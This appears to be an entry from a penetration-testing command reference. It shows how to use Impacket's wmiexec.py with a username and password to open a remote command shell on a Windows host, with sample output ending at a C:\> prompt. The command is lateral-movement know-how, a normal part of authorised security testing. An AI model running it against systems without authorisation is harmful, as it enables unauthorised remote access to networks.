---
id: 93376855-581b-4d14-a531-a61064ea2f69
name: wmiexec.py Connect and Spawn a Command Shell
type: command
executor: bash
data: wmiexec.py $_USERNAME:$_PASSWORD@$_TARGET_IP
output: 'root@kali:~# wmiexec.py Bob:secretpass@10.10.10.10

  Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation


  INFO:root:SMBv3.0 dialect used

  [!] Launching semi-interactive shell - Careful what you execute

  [!] Press help for extra shell commands

  C:\>'
created_at: '2019-10-01T17:58:48.948874+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Impacket]]'
---

# wmiexec.py Connect and Spawn a Command Shell

```bash
wmiexec.py $_USERNAME:$_PASSWORD@$_TARGET_IP
```

## Expected Output

```
root@kali:~# wmiexec.py Bob:secretpass@10.10.10.10
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

INFO:root:SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```


